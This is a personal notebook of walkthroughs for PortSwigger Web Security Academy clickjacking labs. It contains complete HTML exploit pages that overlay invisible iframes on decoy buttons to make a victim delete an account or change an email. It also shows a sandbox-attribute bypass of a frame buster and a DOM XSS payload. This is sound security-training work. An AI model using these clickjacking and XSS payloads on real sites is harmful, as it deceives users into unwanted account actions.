---
created: 2026-06-09
---
| `#`  | Solved? | Name                                                             | Date    | Notes     |
| ---- | ------- | ---------------------------------------------------------------- | ------- | --------- |
| `1.` | `✓`     | Basic clickjacking with CSRF token protection                    | `09.06` |           |
| `2.` | `✓`     | Clickjacking with form input data prefilled from a URL parameter | `10.06` |           |
| `3.` | `✓`     | Clickjacking with a frame buster script                          | `10.06` |           |
| `4.` | `✓`     | Exploiting clickjacking vulnerability to trigger DOM-based XSS   | `10.06` | #revision |
| `5.` |         | Multistep clickjacking                                           |         |           |



## 1. Basic clickjacking with CSRF token protection

>[!done]

>[!note]+ Lab description
> - [`Lab: Basic clickjacking with CSRF token protection`](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected)
> - Level: #Apprentice 
> 
> This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.
> 
> To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.
> 
> You can log in to your own account using the following credentials: `wiener:peter`


### Solution

- Log in as `wiener` and see the `Delete account` button:

![[images/walkthrough/PortSwigger/Clickjacking/lab1/1.png]]

- Go to your exploit server and host a base Clickjacking exploit. For now, set the `<iframe>` `opacity` to `50%` to adjust the element placement. Change the `<iframe>` `src` to the `/my-account` link:

```html
<head>
	<style>
		#target_website {
			position: relative;
			width: 1000px;
			height: 1000px;
			opacity: 0.5;
			z-index: 99999;
			}
		#decoy_website {
			position: absolute;
			width: 300px;
			height: 300px;
			z-index: 1;
			}
	</style>
</head>
<body>
	<div id="decoy_website">
	<button>click</button>
	</div>
	<iframe id="target_website" src="https://0aa300b803a45065820893b0008800a6.web-security-academy.net/my-account">
	</iframe>
</body>
```

![[images/walkthrough/PortSwigger/Clickjacking/lab1/2.png]]

- `Store` and `View exploit`. Adjust the elements until the button covers `Delete account`, but do not click.

![[images/walkthrough/PortSwigger/Clickjacking/lab1/3.png]]

- Then change the `<iframe>` opacity to `0.0001`.

```html
<head>
	<style>
		#target_website {
			position: relative;
			width: 1000px;
			height: 1000px;
			opacity: 0.5;
			z-index: 99999;
			}
		#decoy_website {
			position: absolute;
			width: 300px;
			height: 300px;
			z-index: 1;
                        left: 50px;
                        top: 520px;
                        button { background-color: blue }
			}
	</style>
</head>
<body>
	<div id="decoy_website">
	<button>click</button>
	</div>
	<iframe id="target_website" src="https://0aa300b803a45065820893b0008800a6.web-security-academy.net/my-account">
	</iframe>
</body>
```

![[images/walkthrough/PortSwigger/Clickjacking/lab1/4.png]]

- `Deliver exploit to victim`.

![[images/walkthrough/PortSwigger/Clickjacking/lab1/solved.png]]

Solved!
## 2. Clickjacking with form input data prefilled from a URL parameter

>[!done]

>[!note]+ Lab description
> - [`Lab: Clickjacking with form input data prefilled from a URL parameter`](https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input)
> - Level: #Apprentice 
> 
> This lab extends the basic clickjacking example in [Lab: Basic clickjacking with CSRF token protection](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected). The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.
> 
> To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.
> 
> You can log in to your own account using the following credentials: `wiener:peter`
### Solution

- Log in as `wiener` and test the email update functionality. 

![[images/walkthrough/PortSwigger/Clickjacking/lab2/1.png]]

- Notice that if you add an `email` query parameter to the request to your profile, then update the page, you'll see the value of that parameter **pre-populated** into the email field:

![[images/walkthrough/PortSwigger/Clickjacking/lab2/2.png]]

![[images/walkthrough/PortSwigger/Clickjacking/lab2/3.png]]

- If you remove the `id` URL query parameter from the request, you still get your page. 
---
- Go to your exploit server and craft a Clickjacking exploit. For now, set the `<iframe>` `opacity` to `50%` to adjust the element placement. Change the `<iframe>` `src` to the `/my-account` link with `email` set to a value you want the victim to change their email to (without the `id` URL parameter):

```html
<head>
	<style>
		#target_website {
			position: relative;
			width: 1000px;
			height: 1000px;
			opacity: 0.5;
			z-index: 99999;
			}
		#decoy_website {
			position: absolute;
			width: 300px;
			height: 300px;
			z-index: 1;
                        left: 50px;
                        top: 520px;
                        button { background-color: blue }
			}
	</style>
</head>
<body>
	<div id="decoy_website">
	<button>click</button>
	</div>
	<iframe id="target_website" src="https://0a3e007703a764c9800b8b180091001c.web-security-academy.net/my-account?email=pwned%40example.com">
	</iframe>
</body>
```

- `Store` and `View exploit`. Adjust the values until your decoy button covers the `Update email` button on the target website.

![[images/walkthrough/PortSwigger/Clickjacking/lab2/4.png]]

```html
<head>
	<style>
		#target_website {
			position: relative;
			width: 1000px;
			height: 1000px;
			opacity: 0.5;
			z-index: 99999;
			}
		#decoy_website {
			position: absolute;
			width: 300px;
			height: 300px;
			z-index: 1;
                        left: 60px;
                        top: 470px;
                        button { background-color: blue }
			}
	</style>
</head>
<body>
	<div id="decoy_website">
	<button>click</button>
	</div>
	<iframe id="target_website" src="https://0a3e007703a764c9800b8b180091001c.web-security-academy.net/my-account?email=pwned%40example.com">
	</iframe>
</body>
```

- Then reduce the opacity to `0.0001`, `Store` and `Deliver exploit to victim`.

```html
<head>
	<style>
		#target_website {
			position: relative;
			width: 1000px;
			height: 1000px;
			opacity: 0.0001;
			z-index: 99999;
			}
		#decoy_website {
			position: absolute;
			width: 300px;
			height: 300px;
			z-index: 1;
                        left: 60px;
                        top: 470px;
                        button { background-color: blue }
			}
	</style>
</head>
<body>
	<div id="decoy_website">
	<button>click</button>
	</div>
	<iframe id="target_website" src="https://0a3e007703a764c9800b8b180091001c.web-security-academy.net/my-account?email=pwned%40example.com">
	</iframe>
</body>
```

![[images/walkthrough/PortSwigger/Clickjacking/lab2/solved.png]]

Solved!
## 3. Clickjacking with a frame buster script

>[!attention] 

>[!note]+ Lab description
> - [`Lab: Clickjacking with a frame buster script`](https://portswigger.net/web-security/clickjacking/lab-frame-buster-script)
> - Level: #Apprentice 
> 
> This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?
> 
> To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Log in as `wiener` and see the email change form. As before, you can add the `email` URL parameter to get the form pre-filled.

```
/my-account?email=pwned%40example.com
```

- Inspect the page source and see a frame busting script:


```js
if(top != self) {
	window.addEventListener("DOMContentLoaded", function() {
		document.body.innerHTML = 'This page cannot be framed';
	}, false);
}
```

![[images/walkthrough/PortSwigger/Clickjacking/lab3/1.png]]

---

- Go to your exploit server and craft a Clickjacking exploit. 
- For now, set the `<iframe>` `opacity` to `50%` to adjust the element placement. 
- Change the `<iframe>` `src` to the `/my-account` link with `email` set to a value you want the victim to change their email to (without the `id` URL parameter).
- Also, add `sandbox="allow-forms"` `<iframe>` attribute.

```html
<head>
	<style>
		#target_website {
			position: relative;
			width: 1000px;
			height: 1000px;
			opacity: 0.5;
			z-index: 99999;
			}
		#decoy_website {
			position: absolute;
			width: 300px;
			height: 300px;
			z-index: 1;
                        left: 50px;
                        top: 520px;
                        button { background-color: blue }
			}
	</style>
</head>
<body>
	<div id="decoy_website">
	<button>click</button>
	</div>
	<iframe sandbox="allow-forms" id="target_website" src="https://0a5d0009040da07680f23f2900e80057.web-security-academy.net/my-account?email=pwned%40example.com">
	</iframe>
</body>
```

- `Store` and `View exploit`. Adjust the values until your decoy button covers the `Update email` button on the target website.

![[images/walkthrough/PortSwigger/Clickjacking/lab3/2.png]]


- Then reduce the opacity to `0.0001`, `Store` and `Deliver exploit to victim`.

```html
<head>
	<style>
		#target_website {
			position: relative;
			width: 1000px;
			height: 1000px;
			opacity: 0.0001;
			z-index: 99999;
			}
		#decoy_website {
			position: absolute;
			width: 300px;
			height: 300px;
			z-index: 1;
                        left: 60px;
                        top: 470px;
                        button { background-color: blue }
			}
	</style>
</head>
<body>
	<div id="decoy_website">
	<button>click</button>
	</div>
	<iframe sandbox="allow-forms" id="target_website" src="https://0a5d0009040da07680f23f2900e80057.web-security-academy.net/my-account?email=pwned%40example.com">
	</iframe>
</body>
```

![[images/walkthrough/PortSwigger/Clickjacking/lab3/solved.png]]

Solved!
## 4. Exploiting clickjacking vulnerability to trigger DOM-based XSS

>[!attention] Needs #revision.

>[!note]+ Lab description
> - [`Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS`](https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss)
> - Level: #Practitioner 
> 
> This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the "Click me" button to call the `print()` function.

### Solution

- Browse the application test the `Submit feedback` functionality. 
- Notice you can get the form pre-filled via `GET` parameters:

```
/feedback?name=test&email=test%40example.com&subject=subject&message=message
```

![[images/walkthrough/PortSwigger/Clickjacking/lab4/1.png]]




- Inspect the JavaScript in the file the page imports.

![[images/walkthrough/PortSwigger/Clickjacking/lab4/2.png]]

- The script injects the value of the `name` URL parameter directly into the DOM. This creates a DOM XSS vulnerability.
- You can trigger `print()` using the following URL:

```
https://0aef007d032560578199574700cf0091.web-security-academy.net/feedback?name=%3cimg%20src%3dx%20onerror%3dprint()%3e&email=test%40example.com&subject=subject&message=message
```

![[images/walkthrough/PortSwigger/Clickjacking/lab4/3.png]]


---

- Go to your exploit server and construct a clickjacking exploit:

```html
<head>
	<style>
		#target_website {
			position: relative;
			width: 1000px;
			height: 1000px;
			opacity: 0.5;
			z-index: 99999;
			}
		#decoy_website {
			position: absolute;
			width: 300px;
			height: 300px;
			z-index: 1;
                        left: 60px;
                        top: 470px;
                        button { background-color: blue }
			}
	</style>
</head>
<body>
	<div id="decoy_website">
	<button>Click me</button>
	</div>
	<iframe id="target_website" src="https://0aef007d032560578199574700cf0091.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=test@example.com&subject=subject&message=message#feedbackResult"></iframe>
	</iframe>
</body>
```

- `Store` and `View exploit`. Adjust the values until your decoy button covers the `Submit feedback` button on the target website.

![[images/walkthrough/PortSwigger/Clickjacking/lab4/4.png]]


- Then reduce the opacity to `0.0001`, `Store` and `View exploit` and test it by clicking the button. Make sure you see `print()`.

![[images/walkthrough/PortSwigger/Clickjacking/lab4/5.png]]


- Then reduce the opacity to `0.0001`, `Store` and `Deliver exploit to victim`.

```html
<head>
	<style>
		#target_website {
			position: relative;
			width: 1000px;
			height: 1000px;
			opacity: 0.0001;
			z-index: 99999;
			}
		#decoy_website {
			position: absolute;
			width: 300px;
			height: 300px;
			z-index: 1;
                        left: 60px;
                        top: 880px;
                        button { background-color: blue }
			}
	</style>
</head>
<body>
	<div id="decoy_website">
	<button>Click me</button>
	</div>
       <iframe id="target_website" src="https://0aef007d032560578199574700cf0091.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=test@example.com&subject=subject&message=message#feedbackResult"></iframe>
</body>
```

```html
<style>
	iframe {
		position:relative;
		width: 500px;
		height: 700px;
		opacity: 0.0001;
		z-index: 2;
	}
	div {
		position:absolute;
		top: 610px;
		left: 80px;
		z-index: 1;
	}
</style>
<div>Click me</div>
<iframe
src="https://0aef007d032560578199574700cf0091.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

## 5. Multi-step clickjacking

>[!note]+ Lab description
- [`Lab: Multistep clickjacking`](https://portswigger.net/web-security/clickjacking/lab-multistep)
- Level: #Practitioner 

### Solution
